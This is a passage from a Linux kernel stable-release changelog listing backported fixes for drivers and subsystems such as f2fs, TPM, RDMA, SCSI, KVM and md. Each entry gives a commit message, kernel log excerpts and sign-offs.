CONFIG\_NR\_CPUS=8192 (e.g. Ubuntu 16.04 and 18.04 use this):
drivers/hv//channel\_mgmt.c: In function ‘init\_vp\_index’:
drivers/hv//channel\_mgmt.c:702:1: warning: the frame size of 1032 bytes
is larger than 1024 bytes [-Wframe-larger-than=]
Nowadays it looks most distros enable CONFIG\_CPUMASK\_OFFSTACK=y, and
hence we can work around the warning by using cpumask\_var\_t.
Signed-off-by: Dexuan Cui
Cc: K. Y. Srinivasan
Cc: Haiyang Zhang
Cc: Stephen Hemminger
Cc:
Signed-off-by: K. Y. Srinivasan
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit a28549b8c14c868827dd32d856738685261d0e31
Author: Jaegeuk Kim
Date: Tue Sep 25 13:54:33 2018 -0700
f2fs: clear PageError on the read path
[ Upstream commit fb7d70db305a1446864227abf711b756568f8242 ]
When running fault injection test, I hit somewhat wrong behavior in f2fs\_gc ->
gc\_data\_segment():
0. fault injection generated some PageError'ed pages
1. gc\_data\_segment
-> f2fs\_get\_read\_data\_page(REQ\_RAHEAD)
2. move\_data\_page
-> f2fs\_get\_lock\_data\_page()
-> f2f\_get\_read\_data\_page()
-> f2fs\_submit\_page\_read()
-> submit\_bio(READ)
-> return EIO due to PageError
-> fail to move data
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f4b5f4393bff46eeece7168661c3424bb720d272
Author: Javier Martinez Canillas
Date: Thu Aug 30 16:40:05 2018 +0200
tpm: suppress transmit cmd error logs when TPM 1.2 is disabled/deactivated
[ Upstream commit 0d6d0d62d9505a9816716aa484ebd0b04c795063 ]
For TPM 1.2 chips the system setup utility allows to set the TPM device in
one of the following states:
\* Active: Security chip is functional
\* Inactive: Security chip is visible, but is not functional
\* Disabled: Security chip is hidden and is not functional
When choosing the "Inactive" state, the TPM 1.2 device is enumerated and
registered, but sending TPM commands fail with either TPM\_DEACTIVATED or
TPM\_DISABLED depending if the firmware deactivated or disabled the TPM.
Since these TPM 1.2 error codes don't have special treatment, inactivating
the TPM leads to a very noisy kernel log buffer that shows messages like
the following:
tpm\_tis 00:05: 1.2 TPM (device-id 0x0, rev-id 78)
tpm tpm0: A TPM error (6) occurred attempting to read a pcr value
tpm tpm0: TPM is disabled/deactivated (0x6)
tpm tpm0: A TPM error (6) occurred attempting get random
tpm tpm0: A TPM error (6) occurred attempting to read a pcr value
ima: No TPM chip found, activating TPM-bypass! (rc=6)
tpm tpm0: A TPM error (6) occurred attempting get random
tpm tpm0: A TPM error (6) occurred attempting get random
tpm tpm0: A TPM error (6) occurred attempting get random
tpm tpm0: A TPM error (6) occurred attempting get random
Let's just suppress error log messages for the TPM\_{DEACTIVATED,DISABLED}
return codes, since this is expected when the TPM 1.2 is set to Inactive.
In that case the kernel log is cleaner and less confusing for users, i.e:
tpm\_tis 00:05: 1.2 TPM (device-id 0x0, rev-id 78)
tpm tpm0: TPM is disabled/deactivated (0x6)
ima: No TPM chip found, activating TPM-bypass! (rc=6)
Reported-by: Hans de Goede
Signed-off-by: Javier Martinez Canillas
Reviewed-by: Jarkko Sakkinen
Signed-off-by: Jarkko Sakkinen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 18083411913dd92f9fc01aa533f0cdbe594f7425
Author: Adam Thomson
Date: Mon Oct 8 13:53:59 2018 +0100
usb: typec: tcpm: Report back negotiated PPS voltage and current
[ Upstream commit 554fab6dbf20ee7298ed2d4e8398b85e6058abb7 ]
Currently when requesting a specific voltage or current through
the psy interface, for PPS, when reading back from that interface
the values will always be the same as previously given, if the
request was successful. However PPS only allows for 20mV voltage
steps and 50mA current steps, and the psy class expects microvolt
and micro amp requests, so inbetween values can be provided through
this interface. Really when reading back the true values negotiated
should be given, and not the ones originally asked for.
To report the actual values negotiated with the Source, the values
stored are now rounded down to the relevant step units prior to
building the PPS request, so that those values are later correctly
reported through the psy interface. In addition this improves the
adjustments made to meet the operating power requirements of the
platform, which previously could have been slightly out due to not
using valid PPS units of voltage and current.
Signed-off-by: Adam Thomson
Reviewed-by: Guenter Roeck
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 7c190bb8c9a1389a3d8f3379de9cc02a0cfeb2c0
Author: Alan Douglas
Date: Thu Oct 11 17:15:43 2018 +0100
PCI: cadence: Use AXI region 0 to signal interrupts from EP
[ Upstream commit 0652d4b6b56f73c81abbdbc7e26f772cb2dfe370 ]
The IRQ physical address is allocated from region 0, rather than
the highest region. Update the driver to reserve this region in
the bitmap and to use region 0 for all types of interrupt.
This corrects a problem which prevents the interrupt being
signalled correctly if using the first address in the AXI region,
since an offset of zero will always be mapped to region 0.
Fixes: 37dddf14f1ae ("PCI: cadence: Add EndPoint Controller driver for Cadence PCIe controller")
Signed-off-by: Alan Douglas
Signed-off-by: Lorenzo Pieralisi
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 1a5908ddbea7639213aab70f26193de72700ce3d
Author: Honghui Zhang
Date: Mon Oct 15 16:08:52 2018 +0800
PCI: mediatek: Fix mtk\_pcie\_find\_port() endpoint/port matching logic
[ Upstream commit 074d6f32689ce05a084b6fa3db38445745bf11cc ]
The Mediatek's host controller has two slots, each with its own control
registers. The host driver needs to identify what slot is connected to
what port in order to access the device's configuration space.
Current code retrieving slot connected to a given endpoint device.
Assuming each slot is connected to one endpoint device as below:
host bridge
bus 0 --> \_\_\_\_\_\_\_\_\_\_|\_\_\_\_\_\_\_
| |
| |
slot 0 slot 1
bus 1 -->| bus 2 --> |
| |
EP 0 EP 1
During PCI enumeration, system software will scan all the PCI devices on
every bus starting from devfn 0. Using PCI\_SLOT(devfn) for matching an
endpoint to its slot is erroneous in that the devfn does not contain the
hierarchical bus numbering in it. In order to match an endpoint with its
slot (and related port), the PCI tree must be walked up to the root bus
(where the root ports are situated) and then the PCI\_SLOT(devfn)
matching logic can be correctly applied for matching.
This patch fixes the mtk\_pcie\_find\_port() slot matching logic by adding
appropriate PCI tree walking code to retrieve the slot/port a given
endpoint is connected to.
Signed-off-by: Honghui Zhang
[lorenzo.pieralisi@arm.com: rewrote the commit log]
Signed-off-by: Lorenzo Pieralisi
Acked-by: Ryder Lee
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 49c8a09eaa234494a456f1da6770eac7b5feae2c
Author: Tudor.Ambarus@microchip.com
Date: Mon Oct 15 09:00:54 2018 +0000
usb: host: ohci-at91: fix request of irq for optional gpio
[ Upstream commit 325b9313ec3be56c8e2fe03f977fee19cec75820 ]
atmel,oc-gpio is optional. Request its irq only when atmel,oc is set
in device tree.
devm\_gpiod\_get\_index\_optional returns NULL if -ENOENT. Check its
return value for NULL before error, because it is more probable that
atmel,oc is not set.
This fixes the following errors on boards where atmel,oc is not set in
device tree:
[ 0.960000] at91\_ohci 500000.ohci: failed to request gpio "overcurrent" IRQ
[ 0.960000] at91\_ohci 500000.ohci: failed to request gpio "overcurrent" IRQ
[ 0.970000] at91\_ohci 500000.ohci: failed to request gpio "overcurrent" IRQ
Signed-off-by: Tudor Ambarus
Acked-by: Nicolas Ferre
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6a89b3a67a6544dc81ba1ea32f35600a43819623
Author: Selvin Xavier
Date: Mon Oct 8 03:27:53 2018 -0700
RDMA/bnxt\_re: Fix recursive lock warning in debug kernel
[ Upstream commit d455f29f6d76a5f94881ca1289aaa1e90617ff5d ]
Fix possible recursive lock warning. Its a false warning as the locks are
part of two differnt HW Queue data structure - cmdq and creq. Debug kernel
is throwing the following warning and stack trace.
[ 783.914967] ============================================
[ 783.914970] WARNING: possible recursive locking detected
[ 783.914973] 4.19.0-rc2+ #33 Not tainted
[ 783.914976] --------------------------------------------
[ 783.914979] swapper/2/0 is trying to acquire lock:
[ 783.914982] 000000002aa3949d (&(&hwq->lock)->rlock){..-.}, at: bnxt\_qplib\_service\_creq+0x232/0x350 [bnxt\_re]
[ 783.914999]
but task is already holding lock:
[ 783.915002] 00000000be73920d (&(&hwq->lock)->rlock){..-.}, at: bnxt\_qplib\_service\_creq+0x2a/0x350 [bnxt\_re]
[ 783.915013]
other info that might help us debug this:
[ 783.915016] Possible unsafe locking scenario:
[ 783.915019] CPU0
[ 783.915021] ----
[ 783.915034] lock(&(&hwq->lock)->rlock);
[ 783.915035] lock(&(&hwq->lock)->rlock);
[ 783.915037]
\*\*\* DEADLOCK \*\*\*
[ 783.915038] May be due to missing lock nesting notation
[ 783.915039] 1 lock held by swapper/2/0:
[ 783.915040] #0: 00000000be73920d (&(&hwq->lock)->rlock){..-.}, at: bnxt\_qplib\_service\_creq+0x2a/0x350 [bnxt\_re]
[ 783.915044]
stack backtrace:
[ 783.915046] CPU: 2 PID: 0 Comm: swapper/2 Not tainted 4.19.0-rc2+ #33
[ 783.915047] Hardware name: Dell Inc. PowerEdge R730/0599V5, BIOS 1.0.4 08/28/2014
[ 783.915048] Call Trace:
[ 783.915049]
[ 783.915054] dump\_stack+0x90/0xe3
[ 783.915058] \_\_lock\_acquire+0x106c/0x1080
[ 783.915061] ? sched\_clock+0x5/0x10
[ 783.915063] lock\_acquire+0xbd/0x1a0
[ 783.915065] ? bnxt\_qplib\_service\_creq+0x232/0x350 [bnxt\_re]
[ 783.915069] \_raw\_spin\_lock\_irqsave+0x4a/0x90
[ 783.915071] ? bnxt\_qplib\_service\_creq+0x232/0x350 [bnxt\_re]
[ 783.915073] bnxt\_qplib\_service\_creq+0x232/0x350 [bnxt\_re]
[ 783.915078] tasklet\_action\_common.isra.17+0x197/0x1b0
[ 783.915081] \_\_do\_softirq+0xcb/0x3a6
[ 783.915084] irq\_exit+0xe9/0x100
[ 783.915085] do\_IRQ+0x6a/0x120
[ 783.915087] common\_interrupt+0xf/0xf
[ 783.915088]
Use nested notation for the spin\_lock to avoid this warning.
Signed-off-by: Selvin Xavier
Signed-off-by: Jason Gunthorpe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0b27b2b27995bcd7b28db3c0697cb0437c812c2a
Author: Selvin Xavier
Date: Mon Oct 8 03:27:56 2018 -0700
RDMA/bnxt\_re: Avoid accessing nq->bar\_reg\_iomem in failure case
[ Upstream commit ed51efd2ce44091a858ad829f666727e7c95695e ]
In the failure path, nq->bar\_reg\_iomem gets accessed without
initializing. Avoid this by calling the bnxt\_qplib\_nq\_stop\_irq only if the
initialization is complete.
Reported-by: Dan Carpenter
Fixes: 1ac5a4047975 ("RDMA/bnxt\_re: Add bnxt\_re RoCE driver")
Fixes: 6e04b1035689 ("RDMA/bnxt\_re: Fix broken RoCE driver due to recent L2 driver changes")
Signed-off-by: Selvin Xavier
Signed-off-by: Jason Gunthorpe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ebd7595dcabf48e9255ca080f7c31a3cbc079010
Author: Denis Drozdov
Date: Thu Oct 11 22:33:57 2018 +0300
IB/ipoib: Clear IPCB before icmp\_send
[ Upstream commit 4d6e4d12da2c308f8f976d3955c45ee62539ac98 ]
IPCB should be cleared before icmp\_send, since it may contain data from
previous layers and the data could be misinterpreted as ip header options,
which later caused the ihl to be set to an invalid value and resulted in
the following stack corruption:
[ 1083.031512] ib0: packet len 57824 (> 2048) too long to send, dropping
[ 1083.031843] ib0: packet len 37904 (> 2048) too long to send, dropping
[ 1083.032004] ib0: packet len 4040 (> 2048) too long to send, dropping
[ 1083.032253] ib0: packet len 63800 (> 2048) too long to send, dropping
[ 1083.032481] ib0: packet len 23960 (> 2048) too long to send, dropping
[ 1083.033149] ib0: packet len 63800 (> 2048) too long to send, dropping
[ 1083.033439] ib0: packet len 63800 (> 2048) too long to send, dropping
[ 1083.033700] ib0: packet len 63800 (> 2048) too long to send, dropping
[ 1083.034124] ib0: packet len 63800 (> 2048) too long to send, dropping
[ 1083.034387] ==================================================================
[ 1083.034602] BUG: KASAN: stack-out-of-bounds in \_\_ip\_options\_echo+0xf08/0x1310
[ 1083.034798] Write of size 4 at addr ffff880353457c5f by task kworker/u16:0/7
[ 1083.034990]
[ 1083.035104] CPU: 7 PID: 7 Comm: kworker/u16:0 Tainted: G O 4.19.0-rc5+ #1
[ 1083.035316] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu2 04/01/2014
[ 1083.035573] Workqueue: ipoib\_wq ipoib\_cm\_skb\_reap [ib\_ipoib]
[ 1083.035750] Call Trace:
[ 1083.035888] dump\_stack+0x9a/0xeb
[ 1083.036031] print\_address\_description+0xe3/0x2e0
[ 1083.036213] kasan\_report+0x18a/0x2e0
[ 1083.036356] ? \_\_ip\_options\_echo+0xf08/0x1310
[ 1083.036522] \_\_ip\_options\_echo+0xf08/0x1310
[ 1083.036688] icmp\_send+0x7b9/0x1cd0
[ 1083.036843] ? icmp\_route\_lookup.constprop.9+0x1070/0x1070
[ 1083.037018] ? netif\_schedule\_queue+0x5/0x200
[ 1083.037180] ? debug\_show\_all\_locks+0x310/0x310
[ 1083.037341] ? rcu\_dynticks\_curr\_cpu\_in\_eqs+0x85/0x120
[ 1083.037519] ? debug\_locks\_off+0x11/0x80
[ 1083.037673] ? debug\_check\_no\_obj\_freed+0x207/0x4c6
[ 1083.037841] ? check\_flags.part.27+0x450/0x450
[ 1083.037995] ? debug\_check\_no\_obj\_freed+0xc3/0x4c6
[ 1083.038169] ? debug\_locks\_off+0x11/0x80
[ 1083.038318] ? skb\_dequeue+0x10e/0x1a0
[ 1083.038476] ? ipoib\_cm\_skb\_reap+0x2b5/0x650 [ib\_ipoib]
[ 1083.038642] ? netif\_schedule\_queue+0xa8/0x200
[ 1083.038820] ? ipoib\_cm\_skb\_reap+0x544/0x650 [ib\_ipoib]
[ 1083.038996] ipoib\_cm\_skb\_reap+0x544/0x650 [ib\_ipoib]
[ 1083.039174] process\_one\_work+0x912/0x1830
[ 1083.039336] ? wq\_pool\_ids\_show+0x310/0x310
[ 1083.039491] ? lock\_acquire+0x145/0x3a0
[ 1083.042312] worker\_thread+0x87/0xbb0
[ 1083.045099] ? process\_one\_work+0x1830/0x1830
[ 1083.047865] kthread+0x322/0x3e0
[ 1083.050624] ? kthread\_create\_worker\_on\_cpu+0xc0/0xc0
[ 1083.053354] ret\_from\_fork+0x3a/0x50
For instance \_\_ip\_options\_echo is failing to proceed with invalid srr and
optlen passed from another layer via IPCB
[ 762.139568] IPv4: \_\_ip\_options\_echo rr=0 ts=0 srr=43 cipso=0
[ 762.139720] IPv4: ip\_options\_build: IPCB 00000000f3cd969e opt 000000002ccb3533
[ 762.139838] IPv4: \_\_ip\_options\_echo in srr: optlen 197 soffset 84
[ 762.139852] IPv4: ip\_options\_build srr=0 is\_frag=0 rr\_needaddr=0 ts\_needaddr=0 ts\_needtime=0 rr=0 ts=0
[ 762.140269] ==================================================================
[ 762.140713] IPv4: \_\_ip\_options\_echo rr=0 ts=0 srr=0 cipso=0
[ 762.141078] BUG: KASAN: stack-out-of-bounds in \_\_ip\_options\_echo+0x12ec/0x1680
[ 762.141087] Write of size 4 at addr ffff880353457c7f by task kworker/u16:0/7
Signed-off-by: Denis Drozdov
Reviewed-by: Erez Shitrit
Reviewed-by: Feras Daoud
Signed-off-by: Leon Romanovsky
Signed-off-by: Jason Gunthorpe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9f7a37efdf32f7d13d2151826a4f6198b45fe848
Author: Leon Romanovsky
Date: Thu Oct 11 22:36:10 2018 +0300
RDMA/cm: Respect returned status of cm\_init\_av\_by\_path
[ Upstream commit e54b6a3bcd1ec972b25a164bdf495d9e7120b107 ]
Add missing check for failure of cm\_init\_av\_by\_path
Fixes: e1444b5a163e ("IB/cm: Fix automatic path migration support")
Reported-by: Slava Shwartsman
Reviewed-by: Parav Pandit
Signed-off-by: Leon Romanovsky
Signed-off-by: Jason Gunthorpe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit bc280cf5299d619feff74fd03f8e4ef3345c251f
Author: Parav Pandit
Date: Sun Oct 7 12:12:40 2018 +0300
RDMA/core: Do not expose unsupported counters
[ Upstream commit 0f6ef65d1c6ec8deb5d0f11f86631ec4cfe8f22e ]
If the provider driver (such as rdma\_rxe) doesn't support pma counters,
avoid exposing its directory similar to optional hw\_counters directory.
If core fails to read the PMA counter, return an error so that user can
retry later if needed.
Fixes: 35c4cbb17811 ("IB/core: Create get\_perf\_mad function in sysfs.c")
Reported-by: Holger Hoffstätte
Tested-by: Holger Hoffstätte
Signed-off-by: Parav Pandit
Signed-off-by: Leon Romanovsky
Signed-off-by: Doug Ledford
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 51b6d8b00dff85097364cf416c1d8c29c456b83b
Author: Wenwen Wang
Date: Sat Oct 6 13:34:21 2018 -0500
scsi: megaraid\_sas: fix a missing-check bug
[ Upstream commit 47db7873136a9c57c45390a53b57019cf73c8259 ]
In megasas\_mgmt\_compat\_ioctl\_fw(), to handle the structure
compat\_megasas\_iocpacket 'cioc', a user-space structure megasas\_iocpacket
'ioc' is allocated before megasas\_mgmt\_ioctl\_fw() is invoked to handle
the packet. Since the two data structures have different fields, the data
is copied from 'cioc' to 'ioc' field by field. In the copy process,
'sense\_ptr' is prepared if the field 'sense\_len' is not null, because it
will be used in megasas\_mgmt\_ioctl\_fw(). To prepare 'sense\_ptr', the
user-space data 'ioc->sense\_off' and 'cioc->sense\_off' are copied and
saved to kernel-space variables 'local\_sense\_off' and 'user\_sense\_off'
respectively. Given that 'ioc->sense\_off' is also copied from
'cioc->sense\_off', 'local\_sense\_off' and 'user\_sense\_off' should have the
same value. However, 'cioc' is in the user space and a malicious user can
race to change the value of 'cioc->sense\_off' after it is copied to
'ioc->sense\_off' but before it is copied to 'user\_sense\_off'. By doing
so, the attacker can inject different values into 'local\_sense\_off' and
'user\_sense\_off'. This can cause undefined behavior in the following
execution, because the two variables are supposed to be same.
This patch enforces a check on the two kernel variables 'local\_sense\_off'
and 'user\_sense\_off' to make sure they are the same after the copy. In
case they are not, an error code EINVAL will be returned.
Signed-off-by: Wenwen Wang
Acked-by: Sumit Saxena
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3223e55786f64882d6a6d7de8b2479abbf1b7cfb
Author: Jim Mattson
Date: Fri Sep 21 10:36:17 2018 -0700
KVM: nVMX: Clear reserved bits of #DB exit qualification
[ Upstream commit cfb634fe3052aefc4e1360fa322018c9a0b49755 ]
According to volume 3 of the SDM, bits 63:15 and 12:4 of the exit
qualification field for debug exceptions are reserved (cleared to
0). However, the SDM is incorrect about bit 16 (corresponding to
DR6.RTM). This bit should be set if a debug exception (#DB) or a
breakpoint exception (#BP) occurred inside an RTM region while
advanced debugging of RTM transactional regions was enabled. Note that
this is the opposite of DR6.RTM, which "indicates (when clear) that a
debug exception (#DB) or breakpoint exception (#BP) occurred inside an
RTM region while advanced debugging of RTM transactional regions was
enabled."
There is still an issue with stale DR6 bits potentially being
misreported for the current debug exception. DR6 should not have been
modified before vectoring the #DB exception, and the "new DR6 bits"
should be available somewhere, but it was and they aren't.
Fixes: b96fb439774e1 ("KVM: nVMX: fixes to nested virt interrupt injection")
Signed-off-by: Jim Mattson
Reviewed-by: Sean Christopherson
Signed-off-by: Paolo Bonzini
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit cd888e8a12a99e55c81c80d2c50a273b32af7107
Author: David Howells
Date: Thu Sep 6 10:19:24 2018 +0100
UAPI: ndctl: Fix g++-unsupported initialisation in headers
[ Upstream commit 9607871f37dc3e717639694b8d0dc738f2a68efc ]
The following code in the linux/ndctl header file:
static inline const char \*nvdimm\_bus\_cmd\_name(unsigned cmd)
{
static const char \* const names[] = {
[ND\_CMD\_ARS\_CAP] = "ars\_cap",
[ND\_CMD\_ARS\_START] = "ars\_start",
[ND\_CMD\_ARS\_STATUS] = "ars\_status",
[ND\_CMD\_CLEAR\_ERROR] = "clear\_error",
[ND\_CMD\_CALL] = "cmd\_call",
};
if (cmd < ARRAY\_SIZE(names) && names[cmd])
return names[cmd];
return "unknown";
}
is broken in a number of ways:
(1) ARRAY\_SIZE() is not generally defined.
(2) g++ does not support "non-trivial" array initialisers fully yet.
(3) Every file that calls this function will acquire a copy of names[].
The same goes for nvdimm\_cmd\_name().
Fix all three by converting to a switch statement where each case returns a
string. That way if cmd is a constant, the compiler can trivially reduce it
and, if not, the compiler can use a shared lookup table if it thinks that is
more efficient.
A better way would be to remove these functions and their arrays from the
header entirely.
Signed-off-by: David Howells
Signed-off-by: Dan Williams
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f2470959c1013874e05cad74e5fcbcbfcddb5f82
Author: Evan Green
Date: Fri Oct 5 10:27:32 2018 -0700
scsi: ufs: Schedule clk gating work on correct queue
[ Upstream commit f4bb7704699beee9edfbee875daa9089c86cf724 ]
With commit 10e5e37581fc ("scsi: ufs: Add clock ungating to a separate
workqueue"), clock gating work was moved to a separate work queue with
WQ\_MEM\_RECLAIM set, since clock gating could occur from a memory reclaim
context. Unfortunately, clk\_gating.gate\_work was left queued via
schedule\_delayed\_work, which is a system workqueue that does not have
WQ\_MEM\_RECLAIM set. Because ufshcd\_ungate\_work attempts to cancel
gate\_work, the following warning appears:
[ 14.174170] workqueue: WQ\_MEM\_RECLAIM ufs\_clk\_gating\_0:ufshcd\_ungate\_work is flushing !WQ\_MEM\_RECLAIM events:ufshcd\_gate\_work
[ 14.174179] WARNING: CPU: 4 PID: 173 at kernel/workqueue.c:2440 check\_flush\_dependency+0x110/0x118
[ 14.205725] CPU: 4 PID: 173 Comm: kworker/u16:3 Not tainted 4.14.68 #1
[ 14.212437] Hardware name: Google Cheza (rev1) (DT)
[ 14.217459] Workqueue: ufs\_clk\_gating\_0 ufshcd\_ungate\_work
[ 14.223107] task: ffffffc0f6a40080 task.stack: ffffff800a490000
[ 14.229195] PC is at check\_flush\_dependency+0x110/0x118
[ 14.234569] LR is at check\_flush\_dependency+0x110/0x118
[ 14.239944] pc : [] lr : [] pstate: 60c001c9
[ 14.333050] Call trace:
[ 14.427767] [] check\_flush\_dependency+0x110/0x118
[ 14.434219] [] start\_flush\_work+0xac/0x1fc
[ 14.440046] [] flush\_work+0x40/0x94
[ 14.445246] [] \_\_cancel\_work\_timer+0x11c/0x1b8
[ 14.451433] [] cancel\_delayed\_work\_sync+0x20/0x30
[ 14.457886] [] ufshcd\_ungate\_work+0x24/0xd0
[ 14.463800] [] process\_one\_work+0x32c/0x690
[ 14.469713] [] worker\_thread+0x218/0x338
[ 14.475361] [] kthread+0x120/0x130
[ 14.480470] [] ret\_from\_fork+0x10/0x18
The simple solution is to put the gate\_work on the same WQ\_MEM\_RECLAIM
work queue as the ungate\_work.
Fixes: 10e5e37581fc ("scsi: ufs: Add clock ungating to a separate workqueue")
Signed-off-by: Evan Green
Reviewed-by: Douglas Anderson
Reviewed-by: Stephen Boyd
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 1057c64748b615fdfdd28ea5ca0895675dca5e24
Author: Finn Thain
Date: Tue Oct 16 16:31:25 2018 +1100
scsi: esp\_scsi: Track residual for PIO transfers
[ Upstream commit fd47d919d0c336e7c22862b51ee94927ffea227a ]
If a target disconnects during a PIO data transfer the command may fail
when the target reconnects:
scsi host1: DMA length is zero!
scsi host1: cur adr[04380000] len[00000000]
The scsi bus is then reset. This happens because the residual reached
zero before the transfer was completed.
The usual residual calculation relies on the Transfer Count registers.
That works for DMA transfers but not for PIO transfers. Fix the problem
by storing the PIO transfer residual and using that to correctly
calculate bytes\_sent.
Fixes: 6fe07aaffbf0 ("[SCSI] m68k: new mac\_esp scsi driver")
Tested-by: Stan Johnson
Signed-off-by: Finn Thain
Tested-by: Michael Schmitz
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 1db5dec2dd69e6fcaf59ab6b151877c1119e3de7
Author: Rob Herring
Date: Mon Oct 22 09:03:54 2018 -0500
of: Add missing exports of node name compare functions
[ Upstream commit 173ee3962959a1985a109f81539a403b5cd07ae7 ]
Commit f42b0e18f2e5 ("of: add node name compare helper functions")
failed to add the module exports to of\_node\_name\_eq() and
of\_node\_name\_prefix(). Add them now.
Fixes: f42b0e18f2e5 ("of: add node name compare helper functions")
Signed-off-by: Rob Herring
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit b5e07d44b06be67947150e80e510ef64b720af3b
Author: Jack Wang
Date: Fri Oct 19 16:21:31 2018 +0200
md: fix memleak for mempool
[ Upstream commit 6aaa58c994277647f8b05ffef3b9b225a2d08f36 ]
I noticed kmemleak report memory leak when run create/stop
md in a loop, backtrace:
[<000000001ca975e7>] mempool\_create\_node+0x86/0xd0
[<0000000095576bcd>] md\_run+0x1057/0x1410 [md\_mod]
[<000000007b45c5fc>] do\_md\_run+0x15/0x130 [md\_mod]
[<000000001ede9ec0>] md\_ioctl+0x1f49/0x25d0 [md\_mod]
[<000000004142cacf>] blkdev\_ioctl+0x680/0xd00
The root cause is we alloc mddev->flush\_pool and
mddev->flush\_bio\_pool in md\_run, but from do\_md\_stop
will not call into md\_stop but \_\_md\_stop, move the
mempool\_destroy to \_\_md\_stop fixes the problem for me.
The bug was introduced in 5a409b4f56d5, the fixes should go to
4.18+
Fixes: 5a409b4f56d5 ("MD: fix lock contention for flush bios")
Signed-off-by: Jack Wang
Reviewed-by: Xiao Ni
Signed-off-by: Shaohua Li
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit fbf975efbfbf6b99a559f971d8be5710904a30bb
Author: Xiao Ni
Date: Sat Oct 20 08:09:25 2018 +0800
MD: Memory leak when flush bio size is zero
[ Upstream commit af9b926de9c5986ab009e64917de87c9758bab10 ]
flush\_pool is leaked when flush bio size is zero
Fixes: 5a409b4f56d5 ("MD: fix lock contention for flush bios")
Signed-off-by: David Jeffery
Signed-off-by: Xiao Ni
Signed-off-by: Shaohua Li
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 64c90d9c15e54f1bddad973bb58c30c18587ca67
Author: Chao Yu
Date: Mon Oct 22 23:24:28 2018 +0800
f2fs: fix to account IO correctly for cgroup writeback
[ Upstream commit 78efac537de33faab9a4302cc05a70bb4a8b3b63 ]
Now, we have supported cgroup writeback, it depends on correctly IO
account of specified filesystem.
But in commit d1b3e72d5490 ("f2fs: submit bio of in-place-update pages"),
we split write paths from f2fs\_submit\_page\_mbio() to two:
- f2fs\_submit\_page\_bio() for IPU path
- f2fs\_submit\_page\_bio() for OPU path
But still we account write IO only in f2fs\_submit\_page\_mbio(), result in
incorrect IO account, fix it by adding missing IO account in IPU path.
Fixes: d1b3e72d5490 ("f2fs: submit bio of in-place-update pages")
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 5151f4407da2715429801784d76507f0b359470f
Author: Johan Hovold
Date: Mon Aug 27 10:21:51 2018 +0200
net: stmmac: dwmac-sun8i: fix OF child-node lookup
[ Upstream commit ac63043d8cb5503c7e0fe110f947eacf2663804e ]
Use the new of\_get\_compatible\_child() helper to lookup the mdio-internal
child node instead of using of\_find\_compatible\_node(), which searches
the entire tree from a given start node and thus can return an unrelated
(i.e. non-child) node.
This also addresses a potential use-after-free (e.g. after probe
deferral) as the tree-wide helper drops a reference to its first
argument (i.e. the mdio-mux node). Fortunately, this was inadvertently
balanced by a failure to drop the mdio-mux reference after lookup.
While at it, also fix the related mdio-internal- and phy-node reference
leaks.
Fixes: 634db83b8265 ("net: stmmac: dwmac-sun8i: Handle integrated/external MDIOs")
Tested-by: Corentin Labbe
Cc: Andrew Lunn
Cc: Giuseppe Cavallaro
Cc: Alexandre Torgue
Cc: Jose Abreu
Cc: David S. Miller
Signed-off-by: Johan Hovold
Signed-off-by: Rob Herring
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 48936133e367d742cf0a4b95869e688e61f73398
Author: Michal Hocko
Date: Thu Oct 18 10:56:17 2018 +0200
cgroup, netclassid: add a preemption point to write\_classid
[ Upstream commit a90e90b7d55e789c71d85b946ffb5c1ab2f137ca ]
We have seen a customer complaining about soft lockups on !PREEMPT
kernel config with 4.4 based kernel
[1072141.435366] NMI watchdog: BUG: soft lockup - CPU#21 stuck for 22s! [systemd:1]
